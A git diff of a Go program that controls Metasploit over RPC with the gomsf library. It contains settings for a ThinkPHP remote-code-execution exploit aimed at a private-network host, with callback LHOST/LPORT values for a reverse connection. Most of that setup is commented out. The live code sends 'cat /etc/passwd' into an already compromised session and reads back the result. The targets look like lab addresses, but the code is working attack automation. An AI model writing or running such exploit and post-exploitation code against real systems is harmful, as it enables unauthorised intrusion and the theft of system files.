@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"github.com/iami317/gomsf"
+	"time"
 )
 
 func main() {
@@ -16,9 +17,9 @@ func main() {
 	}
 	defer client.Logout()
 
-	if err = client.HealthCheck(); err != nil {
-		panic(err)
-	}
+	//if err = client.HealthCheck(); err != nil {
+	//	panic(err)
+	//}
 
 	//version, err := client.Core.Version()
 	//exploits, err := client.Module.Exploits()
@@ -33,19 +34,57 @@ func main() {
 	//encoded, err := client.Module.Encode("AAAA", "x86/shikata_ga_nai", &gomsf.EncodeOptions{
 	//	Format: "c",
 	//})
-
-	exploit, err := client.Module.UseExploit("unix/webapp/thinkphp_rce")
-	err = exploit.Set("RHOSTS", "192.168.100.149")
-	if err != nil {
-		fmt.Println(err)
-	}
-	exploit.Set("RPORT", "8081")
-	exploit.Set("TARGETURI", "/")
-	exploit.Set("SRVHOST", "0.0.0.0")
-	exploit.Set("SRVPORT", "8080")
-	exploit.Set("LHOST", "192.168.0.199")
-	exploit.Set("LPORT", "4444")
+	//pluginList, _ := client.Plugins.List()
+	//fmt.Println(pluginList)
+	//exploit, err := client.Module.UseExploit("unix/webapp/thinkphp_rce")
+	//err = exploit.Set("RHOSTS", "192.168.100.149")
+	//if err != nil {
+	//	fmt.Println(err)
+	//}
+	//exploit.Set("RPORT", "8081")
+	//exploit.Set("TARGETURI", "/")
+	//exploit.Set("SRVHOST", "0.0.0.0")
+	//exploit.Set("SRVPORT", "8080")
+	//exploit.Set("LHOST", "192.168.0.199")
+	//exploit.Set("LPORT", "4444")
 	//options := exploit.OptionsAdvanced()
 	//detail := exploit.OptionsDetail()
-	fmt.Println(exploit.Get("RHOSTS"))
+	//fmt.Println(exploit.Get("RHOSTS"))
+	/*
+		res, err := client.Module.Execute(gomsf.ExploitType, "unix/webapp/thinkphp_rce", map[string]interface{}{
+			"RHOST":   "192.168.100.149",
+			"RPORT":   "8081",
+			"SRVHOST": "0.0.0.0",
+			"SRVPORT": "8080",
+			"LHOST":   "192.168.110.33",
+			"LPORT":   "4444",
+		})
+		fmt.Println(res, err)
+		if res.JobID > 0 && len(res.UUID) > 0 {
+			jobId := strconv.Itoa(int(res.JobID))
+			jobRes, _ := client.Jobs.Info(jobId)
+			fmt.Println(res.JobID, res.UUID)
+			fmt.Println("jobRes", jobRes)
+		} else {
+			fmt.Println("攻击失败")
+			return
+		}
+		//
+
+	*/
+	//list, _ := client.Session.List()
+	//fmt.Println(list)
+	//return
+
+	err = client.Session.Write(7, "cat /etc/passwd")
+	fmt.Println(err)
+	time.Sleep(time.Second * 2)
+	s, err := client.Session.Read(7)
+	fmt.Println(s)
+	fmt.Println(err)
+
+	//fmt.Println(client.Session.Stop(5))
+	//fmt.Println(client.Session.Stop(6))
+	//list, _ := client.Session.List()
+	//fmt.Println(list)
 }
